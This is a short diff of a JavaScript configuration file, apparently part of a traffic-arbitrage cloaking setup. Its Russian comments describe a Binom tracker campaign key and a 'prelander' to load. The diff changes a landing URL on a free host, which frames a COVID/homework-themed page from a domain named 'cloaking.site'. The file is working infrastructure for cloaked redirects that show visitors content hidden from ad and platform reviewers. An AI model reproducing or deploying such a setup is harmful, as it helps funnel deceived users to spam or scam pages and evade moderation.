@@ -1,5 +1,5 @@
 var binomCampaingKey = 'qg15f8wf5z6hjqlp36rd'; /*Netlify _Essay id:371. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
-var landingUrl = 'https://endemic-tours.000webhostapp.com/public_html/frame.php?link=https://cloaking.site/landing/homework/covid_2_frame/?flowtag=12520'; /*Адрес преленда, который необходимо подгрузить*/
+var landingUrl = 'https://endemic-tours.000webhostapp.com/frame.php?link=https://cloaking.site/landing/homework/covid_2_frame/?flowtag=12520'; /*Адрес преленда, который необходимо подгрузить*/
 
 var landing = landingUrl;
 /* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
